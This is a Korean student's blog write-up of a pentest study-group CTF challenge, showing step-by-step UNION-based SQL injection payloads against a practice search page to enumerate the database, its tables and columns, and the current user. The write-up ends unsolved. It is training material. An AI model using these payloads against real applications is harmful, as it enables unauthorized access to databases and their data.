---
layout: post
title:  노말틱 모의해킹 스터디 6주차 CTF 문제 (2)
author: leewoojin
date: 2025-05-09 00:00:00 +0900
categories: [Pentest, W6]
tags: []
---

## 🧪 시도 과정 및 풀이
### 🎯 시도 1 – 기본 검색 동작 확인
검색창에 `normaltic`을 입력한 결과, 정상적인 검색 결과 동작을 확인할 수 있었습니다. 

<img width="1175" alt="Image" src="https://github.com/user-attachments/assets/56890963-3229-4c48-a687-a9143f60d1d7" />

### 🎯 시도 2 – `' OR '1'='1` 입력 시 동작
실수로 SQL 주석(--)을 붙이지 않고 `' OR '1'='1` 만 입력해봤더니 
`doldol`의 계정에서  Info 부분에서 `"my name is normaltic"`
출력하는 것을 확인했습니다. 

<img width="1172" alt="Image" src="https://github.com/user-attachments/assets/b44f8ecc-3341-4a44-b0b4-2b40fd518335" />

### 🎯 시도 2 – `' OR '1'='1-- ` 주석 처리 후 입력
`doldol`의 원래 계정대로 출력되는 것을 확인할 수 있었습니다. 

<img width="1155" alt="Image" src="https://github.com/user-attachments/assets/c1126c8b-2fff-4213-bae1-d7d3f5a5c4ae" />

### 🎯 시도 3 – `' order by 7-- ` 컬럼이 6개라는 것을 확인

doldol' UNION SELECT 1,2,3,4,5,6-- 
<img width="1161" alt="Image" src="https://github.com/user-attachments/assets/9a5de7b2-6b75-44ef-85ce-3016283d22ac" />

doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,6-- 
> Info 6이 찍히는 것을 확인
<img width="1156" alt="Image" src="https://github.com/user-attachments/assets/fabf6106-9485-4ed5-95d1-1d6c48a8fe55" />

doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,database()-- 
> DB 이름이 sqli_5 라는 것을 확인
<img width="1168" alt="Image" src="https://github.com/user-attachments/assets/d00cfe96-5a49-49ee-bc5a-f4ebcde4e707" />


doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables WHERE table_schema='sqli_5'-- 
> 테이블 이름이 flag_honey 라는 것을 확인 
<img width="1142" alt="Image" src="https://github.com/user-attachments/assets/c9326907-2abc-4960-94ed-0da66ac5f188" />

doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name='flag_honey'-- 

<img width="1145" alt="Image" src="https://github.com/user-attachments/assets/6dc80c99-7926-46d9-95d7-052aa429cad8" />


doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,flag FROM flag_honey-- 
> 하핳 아니라네 ;ㅁ;
<img width="1149" alt="Image" src="https://github.com/user-attachments/assets/ab915c23-1d40-4a97-b22d-97776372ee7a" />

	
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables--
> 어디서 놓친게 있나 생각해봐도 없는데 information_schema.tables에 where 조건문을 안쓰면 테이블이 왕창 나온다는 것을 기억하고 확인해보니 CHARACTER_SETS 테이블이 있는 것을 확인

<img width="1171" alt="Image" src="https://github.com/user-attachments/assets/9ed76ed7-ada8-4001-a22e-eeaada16c9aa" />

doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name='CHARACTER_SETS'--
> CHARACTER_SET_NAME
<img width="1127" alt="Image" src="https://github.com/user-attachments/assets/f1c5eed3-1c11-4373-b2bd-e7adeac12530" />

doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,CHARACTER_SET_NAME FROM CHARACTER_SETS-- 
> 이렇게 했더니 안나온다 왜?!?!?!?!?!?!?

doldol' AND 1=0 UNION SELECT 1,2,3,4,5,user()-- 
> 이게 또 database()만 있는게 아니구나 
<img width="1157" alt="Image" src="https://github.com/user-attachments/assets/f5eab93f-3b99-4071-bbb9-8843a1f0b798" />